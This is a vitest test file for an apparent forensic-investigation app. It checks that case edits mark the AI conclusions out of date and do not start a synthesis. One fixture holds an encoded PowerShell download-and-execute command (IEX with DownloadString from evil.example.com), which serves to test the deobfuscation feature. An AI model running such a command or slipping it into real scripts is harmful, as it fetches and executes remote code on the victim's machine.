// #1599: only AI-on, Re-synthesize, import completion and the last duplicate-host resolve may start a
// synthesis. Every other case change marks the conclusions out of date and leaves the run to the
// analyst.
//
// The trigger for the rule: on a lab case the anonymization switch called synthesize() directly — no
// job, no busy check — three seconds before the analyst turned AI on. Two seven-minute syntheses ran
// side by side and the later one overwrote the other. These tests drive each former trigger through
// the real app with AI switched ON for the case, so a leftover kick would reach the spy.
import { describe, it, expect, beforeEach, vi } from "vitest";
import { mkdtemp } from "node:fs/promises";
import { tmpdir } from "node:os";
import { join } from "node:path";
import request from "supertest";
import { CaseStore } from "../../src/storage/caseStore.js";
import { StateStore } from "../../src/analysis/stateStore.js";
import { AiControlStore } from "../../src/analysis/aiControl.js";
import { SynthMetaStore } from "../../src/analysis/synthMeta.js";
import { PresidioPendingStore } from "../../src/analysis/presidioPending.js";
import { createApp } from "../../src/server.js";
import { emptyState, type ForensicEvent } from "../../src/analysis/stateTypes.js";
import type { AnalysisPipeline } from "../../src/analysis/pipeline.js";

const OUT_OF_DATE = "conclusions out of date — press Re-synthesize";

function ev(id: string, description = "d"): ForensicEvent {
  return {
    id,
    timestamp: "2026-04-22T11:41:00Z",
    description,
    severity: "High",
    mitreTechniques: [],
    relatedFindingIds: [],
    sourceScreenshots: [],
    asset: "ws-01.example.com",
    sources: ["Sysmon"],
  };
}

// UTF-16LE base64 of `IEX (New-Object Net.WebClient).DownloadString('http://evil.example.com/a')`.
const ENCODED = Buffer.from(
  "IEX (New-Object Net.WebClient).DownloadString('http://evil.example.com/a')",
  "utf16le",
).toString("base64");

let app: ReturnType<typeof createApp>;
let synthesize: ReturnType<typeof vi.fn>;
let meta: SynthMetaStore;
let cases: CaseStore;

beforeEach(async () => {
  const root = await mkdtemp(join(tmpdir(), "dfir-synth-rule-"));
  cases = new CaseStore(root);
  await cases.createCase({ caseId: "c1", name: "n", investigator: "i", aiProvider: null });
  const stateStore = new StateStore(cases);
  const s = emptyState("c1");
  s.forensicTimeline.push(ev("e1"), ev("e2", `powershell.exe -enc ${ENCODED}`));
  await stateStore.save(s);
  // AI ON for the case: a leftover resynthesizeInBackground would get past its toggle check.
  await new AiControlStore(cases).save("c1", { enabled: true, lastAnalyzedSeq: 0 });
  synthesize = vi.fn(async () => stateStore.load("c1"));
  const pipeline = {
    hasAiProvider: () => true,
    hasSynthesisProvider: () => true,
    synthesize,
    promoteSuperTimeline: vi.fn(async () => {}),
  } as unknown as AnalysisPipeline;
  meta = new SynthMetaStore(cases);
  app = createApp(cases, {
    stateStore,
    pipeline,
    aiConfigured: true,
    synthMetaStore: meta,
    sourceTrustStore: {
      load: async () => ({}),
      save: async (_c: string, o: unknown) => o,
    } as never,
    superTimelineStore: { get: async (_c: string, id: string) => ev(id) } as never,
  });
});

/** Let any fire-and-forget kick reach the pipeline before asserting it did not. */
const settle = () => new Promise((r) => setTimeout(r, 50));

async function expectOutOfDateAndNoRun(reason: string): Promise<void> {
  await settle();
  expect(synthesize).not.toHaveBeenCalled();
  expect((await meta.load("c1")).outOfDate?.reason).toBe(reason);
  const state = await request(app).get("/cases/c1/ai-state");
  expect(state.body).toMatchObject({ state: "idle", outOfDate: true, detail: OUT_OF_DATE });
}

describe("former synthesis triggers only mark the conclusions out of date (#1599)", () => {
  it("anonymization switch", async () => {
    const res = await request(app).post("/cases/c1/anon-control").send({ enabled: false });
    expect(res.status).toBe(200);
    await expectOutOfDateAndNoRun("anonymization changed");
  });

  it("an anonymization category change, not only the main switch", async () => {
    const res = await request(app)
      .post("/cases/c1/anon-control")
      .send({ categories: { IP: false } });
    expect(res.status).toBe(200);
    await expectOutOfDateAndNoRun("anonymization changed");
  });

  it("an anonymization POST that changes nothing marks nothing", async () => {
    const cur = (await request(app).get("/cases/c1/anon-control")).body;
    await request(app).post("/cases/c1/anon-control").send({ enabled: cur.enabled });
    await settle();
    expect((await meta.load("c1")).outOfDate ?? null).toBeNull();
  });

  it("dismiss a finding", async () => {
    const res = await request(app)
      .post("/cases/c1/false-positive")
      .send({ kind: "event", ref: "e1", reason: "known-good-tool" });
    expect(res.status).toBe(200);
    await expectOutOfDateAndNoRun("false positive marked");
  });

  it("bulk dismiss", async () => {
    const res = await request(app)
      .post("/cases/c1/false-positive/batch")
      .send({ items: [{ kind: "event", ref: "e1" }], reason: "known-good-tool" });
    expect(res.status).toBe(200);
    await expectOutOfDateAndNoRun("false positives marked");
  });

  it("undo a dismissal", async () => {
    const res = await request(app).post("/cases/c1/false-positive/remove").send({ id: "nope" });
    expect(res.status).toBe(200);
    await expectOutOfDateAndNoRun("false positive removed");
  });

  it("scope window", async () => {
    const res = await request(app)
      .post("/cases/c1/scope")
      .send({ start: "2026-04-22T00:00:00Z", end: "2026-04-23T00:00:00Z" });
    expect(res.status).toBe(200);
    await expectOutOfDateAndNoRun("scope window changed");
  });

  it("source trust weights", async () => {
    const res = await request(app)
      .put("/cases/c1/source-trust")
      .send({ overrides: { Sysmon: 0.5 } });
    expect(res.status).toBe(200);
    await expectOutOfDateAndNoRun("source trust changed");
  });

  it("promote super-timeline rows", async () => {
    const res = await request(app)
      .post("/cases/c1/super-timeline/promote")
      .send({ eventIds: ["raw-1"] });
    expect(res.status).toBe(200);
    await expectOutOfDateAndNoRun("rows promoted");
  });

  it("add a manual event", async () => {
    const res = await request(app)
      .post("/cases/c1/events")
      .send({ timestamp: "2026-04-22T12:00:00Z", description: "analyst note", severity: "High" });
    expect(res.status).toBe(201);
    await expectOutOfDateAndNoRun("manual event added");
  });

  it("deobfuscation sweep", async () => {
    const res = await request(app).post("/cases/c1/deobfuscate").send({});
    expect(res.status).toBe(200);
    expect(res.body.deobfuscated).toBeGreaterThan(0);
    await expectOutOfDateAndNoRun("commands deobfuscated");
  });
});

describe("the Presidio gate clearing (#1599)", () => {
  it("says ready — press Re-synthesize, not on hold, and starts nothing", async () => {
    await new PresidioPendingStore(cases).save("c1", [{ value: "Jane Doe", category: "PERSON" }]);
    const held = await request(app).get("/cases/c1/ai-state");
    expect(held.body.state).toBe("blocked");
    const res = await request(app)
      .post("/cases/c1/presidio-pending/approve")
      .send({ value: "Jane Doe", category: "PERSON" });
    expect(res.status).toBe(200);
    await settle();
    expect(synthesize).not.toHaveBeenCalled();
    const state = await request(app).get("/cases/c1/ai-state");
    expect(state.body).toMatchObject({ state: "idle", detail: "ready — press Re-synthesize" });
  });
});

describe("the allowed triggers still run (#1599)", () => {
  it("Re-synthesize still runs on a case marked out of date", async () => {
    await request(app).post("/cases/c1/scope").send({ start: "2026-04-22T00:00:00Z" });
    const res = await request(app).post("/cases/c1/synthesize").send({});
    expect(res.status).toBe(200);
    expect(synthesize).toHaveBeenCalledTimes(1);
  });
});
